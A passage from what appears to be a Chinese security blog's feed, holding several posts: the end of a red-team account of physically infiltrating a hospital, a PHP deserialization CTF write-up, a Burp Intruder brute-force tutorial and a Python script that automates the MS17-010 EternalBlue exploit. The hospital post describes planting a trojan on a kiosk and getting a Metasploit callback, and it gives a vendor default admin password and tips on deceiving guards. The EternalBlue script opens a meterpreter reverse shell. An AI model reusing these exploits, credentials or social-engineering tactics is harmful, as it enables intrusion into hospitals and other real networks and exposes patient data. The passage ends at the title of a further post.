alt="image-20210727112802414"></p><p>没事，不是后面有USB接口吗，不正好带了linux免驱的无线网卡吗，但是很不巧，插上他不显示网卡信息。（安卓这块使用外置无线网卡不太懂）于是暂且放弃，开始从wifi下手。</p><p>在门诊楼搜到的wifi是加密的，通过问询工作人员获得了密码，可以访问互联网，连接后获取到的ip是10开头的，跟那个终端机100开头的网络是互不相通的。于是开始探测wifi网络的内网资产。通过扫描探测找到内网资有大量的摄像头弱口令，部分打印机，也有少量的pc，以及三百多台交换机和路由器超级管理员（移动定制的网络设备出厂默认超级管理员账号/密码:CMCCAdmin /aDm8H%MdA），以及少量的ms17-010漏洞等。但是很不巧，这个wifi并不能找到医院核心生产资产。</p><p>于是又去了住院楼。同样，顺利通过了测温和保安大哥的监视。在这里又发现了另外一个wifi，连接后跳出认证页面，获取到的ip是172开头的，看来的电信做的访客wifi，给访客上网用的。但是很不巧，这个wifi内网没有我想要的东西，还没门诊楼拿到的东西多。wifi这块就先放一放，不是还有终端机吗。</p><p>于是，发现在住院楼同样有一台一模一样的安卓导航终端机，但是一想连不了wifi也没啥用啊，报着试试看的心态过去看了下，这台机器并没有插网线，而且他的wifi功能是好的，连接了一个加密的wifi，同样是100开头的ip，但是他不出网。那没事，连上公共wifi先上个线。</p><p>先连接能出网的wifi使其正常访问互联网。</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20211111213610.png" alt="image-20210727144453243"></p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20211111213619.png" alt="image-20210727144500954"></p><p>再通过远程下载木马安装</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20211111213631.png" alt="image-20210727144636736"></p><p>msf监听上线</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20211111213645.png" alt="image-20210727144744883"></p><p>然后用nps给他做了个代理，这样就可以远程打内网了，岂不美哉！</p><p>但是很不巧，连接这个wifi获得的172开头的内网到不了我想要的核心的生产业务网络。</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20211111213654.png" alt="image-20210727145349572"></p><p>对了，不是还有这台机器原本连接的wifi吗，这个wifi是个加密的wifi，想着要不去破解一下，看了下某某万能钥匙平台并没有用户分享过密码。就在准备抓握手包去破解时，试了一下12345678，好家伙，连接上了。</p><p>获取到的ip是100开头的，通过内网探测获得了大量的服务器，而且都有漏洞，也找到了大量的web系统弱口令，而且都是核心生产系统（门诊排队叫号系统、手术排班系统、病房相关系统等）以及一些医生和患者信息。</p><p>除了以上这些，还拿到了一些挂号机和取片机，都是通过跳出沙盒的方式获得。（下次文章简单总结一下常见跳出沙盒的方法）</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20211111213702.png" alt="image-20210727150526021"></p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20211111213712.png" alt="image-20210727164442789"></p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20211111213724.png" alt="image-20210727150614056"></p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20211111213731.png" alt="image-20210727150641726"></p><p>以及门口测温的pc主机。操作这台电脑的时候是晚上，工作人员不在，保安巡视完毕之后过去的，电脑没有关机，但是没有鼠标，这时候就显现出自带设备的重要性了。还有其他一些暴露的pc，如护士站的，但是由于机柜上锁了，又不会开锁，所以也放弃了。</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20211111213741.png" alt="image-20210727150733221"></p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20211111213808.png" alt="image-20210727150825948"></p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>整个过程中经历了很多的波折，当然不止文中这些，但是在一次一次的尝试之下最后还是拿到了一些资产。由于时间有限最后没能进入医卫专网也有点遗憾。在尝试做近源的过程中一定要多观察，应该尽可能的抓住一切能利用到的信息去利用，比如任何暴露的接口、网络或者设备，都可能成为突破点。社工也是非常有利用价值的一部分，可以取得事半功倍的效果。还有就是随身带的一些设备，像便携网卡、HackCube、Nethunter、Badusb等等的设备，越齐全越好。这次去的目标是很容易进到内部的，所以对付安保人员也不是很难，面对保安的时候基本上找个理由就忽悠过去了。一定不要被怀疑抓获！</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20211111213821.png" alt="image-20210727162639853"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 攻防对抗 </tag>
            
            <tag> RedTeam </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每日一题：2020年网鼎杯反序列化题目AreUSerialz复现</title>
      <link href="/2021/02/18/wangdingbeifanxuliehua/"/>
      <url>/2021/02/18/wangdingbeifanxuliehua/</url>
      
        <content type="html"><![CDATA[<p>考点：反序列化、PHP弱类型</p><p>题目复现地址：<a href="https://www.ctfhub.com/" target="_blank" rel="noopener">https://www.ctfhub.com/</a></p><p>打开题目给出源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $op = <span class="string">"1"</span>;</span><br><span class="line">        $filename = <span class="string">"/tmp/tmpfile"</span>;</span><br><span class="line">        $content = <span class="string">"Hello World!"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((string)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $res = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">'str'</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[<span class="string">'str'</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对代码进行分析得到解题思路：通过<code>read()</code>函数包含flag.php来获取flag。</p><p>代码分析：</p><p>通过GET方式接收到str的值，然后通过函数<code>is_valid($str)</code>判断所传入的每一个字符的ASCII值进行判断是否在32到125之间。</p><p>如果符合条件进行下一步，对str进行反序列化，反序列化结束会触发<code>__destruct()</code>函数，<code>__destruct()</code>内对op做判断，如果op等于2(三个等号需要满足两个变量的值相等并且类型相同)则会对op赋值为1，如果判断op不等于2，判断执行完毕后会进入<code>process()</code>函数。</p><p>process()函数先是判断op的值是否等于1，等于1就进去<code>write()</code>函数，等于2就会进入<code>read()</code>函数，读取flag.php的内容当然是要进去read()函数，因此上一步<code>__destruct()</code>函数中要让<code>op===&quot;2&quot;</code>的判断不成立，并且使这一步的<code>op==&#39;2&#39;</code>成立，所以给op赋值init类型2(<code>op=2</code>而不是<code>op=&#39;2&#39;</code>)。</p><p>进去read()函数直接读取flag.php就可拿到flag。</p><p>运行以下代码将FileHandler序列化得到payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> $op=<span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> $filename=<span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> $content=;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> FileHandler();</span><br><span class="line"></span><br><span class="line">$str = serialize($a);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>str=O:11:”FileHandler”:3:{s:2:”op”;i:2;s:8:”filename”;s:8:”flag.php”;s:7:”content”;i:1;}</p>]]></content>
      
      
      <categories>
          
          <category> 练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pikachu靶场——基于表单的暴力破解及Intruder模块的简单介绍</title>
      <link href="/2020/11/18/pikachubaopo/"/>
      <url>/2020/11/18/pikachubaopo/</url>
      
        <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>本文以pikachu靶场作为演示简单介绍了Burpsuit的Intruder模块</p><h1 id="0x01-Burpsuite-Intruder模块简单介绍"><a href="#0x01-Burpsuite-Intruder模块简单介绍" class="headerlink" title="0x01 Burpsuite Intruder模块简单介绍"></a>0x01 Burpsuite Intruder模块简单介绍</h1><p>首先，介绍下burpsuite intruder模块的相关设置，以下三个框分别是并发线程设置（免费版不可修改此处）、失败重试次数、间隔时间设置。</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20201118122525baopo.png" alt=""></p><h2 id="Rerequest-Headers介绍："><a href="#Rerequest-Headers介绍：" class="headerlink" title="Rerequest Headers介绍："></a>Rerequest Headers介绍：</h2><blockquote><p>如果选中‘update Content-Length header’框，Burp Intruder 会使用每个请求的 HTTP 主体长度的正确值，添加或更新这个请求里 HTTP 消息头的内容长度。这个功能对一些需要把可变长度的有效载荷插入到 HTTP 请求模板主体的攻击是很有必要的。这个 HTTP 规范和大多数 web 服务器一样，需要使用消息头内容长度来指定 HTTP 主体长度的正确值。如果没有指定正确值，目标服务器会返回一个错误，也可能返回一个未完成的请求，也可能无限期地等待接收请求里的进一步数据。</p><p>如果选中‘set Connection: close’框，则 Burp Intruder 会添加或更新 HTTP 消息头的连接来请求在每个请求后已关闭的连接。在多数情况下，这个选项会让攻击执行得更快。–来自 <a href="https://www.cnblogs.com/yufusec/p/9179625.html" target="_blank" rel="noopener">https://www.cnblogs.com/yufusec/p/9179625.html</a> </p></blockquote><h2 id="Payload-type介绍"><a href="#Payload-type介绍" class="headerlink" title="Payload type介绍"></a>Payload type介绍</h2><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20201118122559baopo.png" alt="image-20200919171003393"></p><ul><li><p>Simple list:简单字典</p></li><li><p>Runtime file:运行文件</p></li><li><p>Custom iterator:自定义迭代器</p></li><li><p>Character substitution:字符替换</p></li><li><p>Recursive grep:递归查找</p></li><li><p>Illegal unicode:非法字符</p></li><li><p>Character blocks:字符块</p></li><li><p>Numbers:数字组合</p></li><li><p>Dates:日期组合</p></li><li><p>Brute forcer:暴力破解</p></li><li><p>Null payloads:空payload</p></li><li><p>Username generator:用户生成</p></li><li><p>Copy other payload:复制其他payload</p></li></ul><h1 id="0x02-接下载分别用三种模式进行实操"><a href="#0x02-接下载分别用三种模式进行实操" class="headerlink" title="0x02 接下载分别用三种模式进行实操"></a>0x02 接下载分别用三种模式进行实操</h1><h2 id="Sniper"><a href="#Sniper" class="headerlink" title="Sniper:"></a>Sniper:</h2><p>Attack type 选择Sniper</p><p>这是抓到的最初的数据包，需要爆破的地方为username和password，设置这两个参数为payoad位置。</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20201118122616baopo.png" alt="image-20200918004555054"></p><p>payload选择Runtime file然后添加一个字典文件作为payload，Sniper模式同时最多只能选择一个位置进行payload替换，</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20201118122630baopo.png" alt="image-20200918004656269"></p><p>以下是我所加载字典（pass.txt）的内容，0这条数据是原始的数据包（未作payload替换），<img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20201118122651baopo.png" alt="image-20200918004424368"></p><p>Burpsuite会先对第一个位置（username）进行爆破（第二个位置不变），直到字典所有内容跑完，</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20201118122703baopo.png" alt="image-20200918004456026"></p><p>然后对第二个位置（password）进行爆破，直到字典所有内容跑完，</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20201118122718baopo.png" alt="image-20200918004506643"></p><h2 id="Battering-ram"><a href="#Battering-ram" class="headerlink" title="Battering ram:"></a>Battering ram:</h2><p>同样，添加一个字典作为payload后进行爆破，该模式下会同时对选定的两个位置进行替换。</p><p>同时替换为root：</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20201118122734baopo.png" alt="image-20200919174114759"></p><p>同时替换为ggg：</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20201118124811baopo.png" alt="image-20200919174126243"></p><h2 id="Ptichfork"><a href="#Ptichfork" class="headerlink" title="Ptichfork:"></a>Ptichfork:</h2><p>每个变量设置一个payload，分别使用对应的字典对变量进行同时替换;</p><p>Ptichfork模式会对每个位置分别设置一个Payload，</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20201118122746baopo.png" alt="image-20200919174711495"></p><p>以这两个位置为例，会分别用自己的payload逐个进行替换。</p><p>两个位置分别以两个字典的第一个payload进行替换：</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20201118122811%E7%88%86%E7%A0%B4%E3%80%81.png" alt="image-20200919175117018"></p><p>两个位置分别以两个字典的第五个payload进行替换：</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20201118122827baopo.png" alt="image-20200919175226877"></p><h2 id="Cluster-bomb"><a href="#Cluster-bomb" class="headerlink" title="Cluster bomb:"></a>Cluster bomb:</h2><p>需要为每个变量设置一个payload ，分别使用字典内容组合对变量进行替换;</p><p>该模式下会对两个payload进行类似排列组合的方式将两个payload的内容进行逐个匹配</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20201118122837baopo.png" alt="image-20200919175417420"></p><h1 id="0x03-爆破结果查看"><a href="#0x03-爆破结果查看" class="headerlink" title="0x03 爆破结果查看"></a>0x03 爆破结果查看</h1><p>可对结果进行数据包长度排序来找到成功登录对应的账户和密码</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/20201118123051.png" alt="image-20200919175812562"></p><p>也可以添加匹配字符，登陆失败会显示not exists，这里添加not exists为关键词进行测试，登录成功也就没有匹配到not exists</p><p><img src="https://cdn.jsdelivr.net/gh/cluren/imgHosting/img/image-20200919180525945.png" alt="image-20200919180525945"></p>]]></content>
      
      
      <categories>
          
          <category> 练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 靶场 </tag>
            
            <tag> pikachu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python调用Metasploit实现自动化漏洞利用</title>
      <link href="/2020/06/07/pymetasploit/"/>
      <url>/2020/06/07/pymetasploit/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这里介绍两种使用python来操控metasploit的方法，一种是python调用系统命令来实现，另一只是使用pymetasploit3库来实现。</p></blockquote><h1 id="0x01-Python调用系统命令来控制"><a href="#0x01-Python调用系统命令来控制" class="headerlink" title="0x01 Python调用系统命令来控制"></a>0x01 Python调用系统命令来控制</h1><p>第一种方法是将参数信息写入.rc后缀的文件中，利用os库，调用sysytem()函数来执行msfconsole，利用msfconsole -r参数接文件来进行实现。</p><p><strong>安装os库：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install os</span><br></pre></td></tr></table></figure><p>以ms17_010为例，kali ip：192.168.129        目标ip：192.168.1.128 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Handler</span><span class="params">(configFile, lhost, lport, rhost)</span>:</span>  <span class="comment">#漏洞利用参数写入文件</span></span><br><span class="line"></span><br><span class="line">    configFile.write(<span class="string">'use exploit/windows/smb/ms17_010_eternalblue\n'</span>)</span><br><span class="line"></span><br><span class="line">    configFile.write(<span class="string">'set payload windows/x64/meterpreter/reverse_tcp\n'</span>)</span><br><span class="line"></span><br><span class="line">    configFile.write(<span class="string">'set LPORT '</span> + str(lport) + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">    configFile.write(<span class="string">'set LHOST '</span> + str(lhost) + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">    configFile.write(<span class="string">'set RHOST '</span> + str(rhost) + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">    configFile.write(<span class="string">'exploit\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    rhost = <span class="string">'192.168.1.128'</span></span><br><span class="line"></span><br><span class="line">    configFile = open(<span class="string">'ms17_010.rc'</span>, <span class="string">'w'</span>)</span><br><span class="line"></span><br><span class="line">    lhost = <span class="string">'192.168.1.129'</span></span><br><span class="line"></span><br><span class="line">    lport = <span class="number">4444</span></span><br><span class="line"></span><br><span class="line">    Handler(configFile, lhost, lport, rhost)</span><br><span class="line"></span><br><span class="line">    configFile.close()</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'开始metasploitl利用：'</span>)</span><br><span class="line"></span><br><span class="line">    os.system(<span class="string">'msfconsole -q -r ms17_010.rc'</span>)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h1 id="0x02-Pymetasploit3库实现"><a href="#0x02-Pymetasploit3库实现" class="headerlink" title="0x02 Pymetasploit3库实现"></a>0x02 Pymetasploit3库实现</h1><p>第二种方法是直接用Pymetasploit库来对metasploit进行操作，这种方法需要开启msfrpcd服务或者在msfconsole中打开msgrpc插件。</p><p>参考文档：<a href="https://github.com/DanMcInerney/pymetasploit3" target="_blank" rel="noopener"> https://github.com/DanMcInerney/pymetasploit3 </a></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pipenv install --three pymetasploit3</span><br><span class="line">pipenv shell</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install --user pymetasploit3</span><br></pre></td></tr></table></figure><h3 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h3><p>连接到metasploit需要打开PRC服务，方法如下：</p><p><strong>在终端中：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ msfrpcd -P yourpassword -S</span><br></pre></td></tr></table></figure><p>连接代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> pymetasploit3.msfrpc <span class="keyword">import</span> MsfRpcClient</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>client = MsfRpcClient(<span class="string">'yourpassword'</span>, ssl=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><strong>或者在msfconsole中：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ msfconsole</span><br><span class="line">msf&gt; load msgrpc [Pass&#x3D;yourpassword]</span><br></pre></td></tr></table></figure><p>连接代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> pymetasploit3.msfrpc <span class="keyword">import</span> MsfRpcClient</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>client = MsfRpcClient(<span class="string">'yourpassword'</span>, port=<span class="number">55552</span>, <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>以ms17_010为例，kali ip：192.168.129        目标ip：192.168.1.128   </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pymetasploit3.msfrpc <span class="keyword">import</span> MsfRpcClient <span class="comment"># 连接metasploit</span></span><br><span class="line">client = MsfRpcClient(<span class="string">'password'</span>)</span><br><span class="line"></span><br><span class="line">exploit = client.modules.use(<span class="string">'exploit'</span>, <span class="string">'windows/smb/ms17_010_eternalblue'</span>) <span class="comment"># 配置exploit的参数</span></span><br><span class="line">exploit[<span class="string">'RHOSTS'</span>] = <span class="string">'192.168.1.128'</span></span><br><span class="line">payload = client.modules.use(<span class="string">'payload'</span>, <span class="string">'windows/x64/meterpreter/reverse_tcp'</span>) <span class="comment"># 配置payload的参数</span></span><br><span class="line">payload[<span class="string">'LHOST'</span>] = <span class="string">'192.168.1.129'</span> </span><br><span class="line">payload[<span class="string">'LPORT'</span>] = <span class="number">4444</span> </span><br><span class="line">exploit.execute(payload=payload) <span class="comment"># 开始攻击</span></span><br><span class="line"></span><br><span class="line">shell = client.sessions.session(<span class="string">'1'</span>) <span class="comment"># 拿到获取到session的shell</span></span><br><span class="line">shell.write(<span class="string">'pwd'</span>) <span class="comment"># 操控session的shell</span></span><br><span class="line">print(shell.read()) <span class="comment"># 查看操作后的结果</span></span><br></pre></td></tr></table></figure><p>可以同时调用nmap、nessus等，实现自动化漏洞利用。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>四叶草四校友谊赛CTF记录</title>
      <link href="/2020/04/26/siyecaoyouyisai/"/>
